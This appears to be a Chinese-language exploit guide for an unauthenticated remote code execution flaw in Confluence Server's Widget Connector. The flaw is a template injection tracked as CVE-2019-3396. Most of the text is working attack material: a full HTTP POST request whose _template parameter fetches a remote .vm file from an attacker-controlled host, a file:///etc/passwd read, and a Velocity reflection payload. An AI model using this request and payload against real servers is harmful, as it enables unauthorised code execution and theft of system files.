## Confluence未授权RCE，漏洞利用

### 1. 漏洞简述

Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者能利用此漏洞能够实现目录穿越与远程代码执行。  

漏洞分析，请参考：https://paper.seebug.org/884/  


### 2. 漏洞利用

1. 存在漏洞的请求,参数为_template，甚至可以在params键值对增加command:cmd   

	POST /rest/tinymce/1/macro/preview  HTTP/1.1  
	Host: 域名
	User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0  
	Accept: application/json, text/javascript, */*; q=0.01  
	Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
	Accept-Encoding: gzip, deflate  
	Referer: https://域名/pages/viewpage.action?pageId=1147026  
	Content-Type: application/json  
	X-Requested-With: XMLHttpRequest  
	Content-Length: 206  
	Connection: close  
	Cookie: cookie信息    

	{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"http://ip/CVE/CVE-2019-3396/shell.vm"}}}
	
	post的参数模板：  
	
		{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/yuxiaokui/z0.hk/master/rce.vm"}}}


2. 该漏洞支持本地本文件读取，通过file:///etc/passwd   
3. 该漏洞支持远程代码执行，需要先在远程服务器创建.vm文件，内容如下：  
	
		#set($e="e")
		$e.getClass().forName('java.lang.System').getMethod('getProperty', $e.getClass().forName('java.lang.String')).invoke(null, 'os.name').toString()
4. 将上述报文保存为.vm，可通过ftp\http\https进行访问，因confluence版本问题，可能会对某些协议不支持  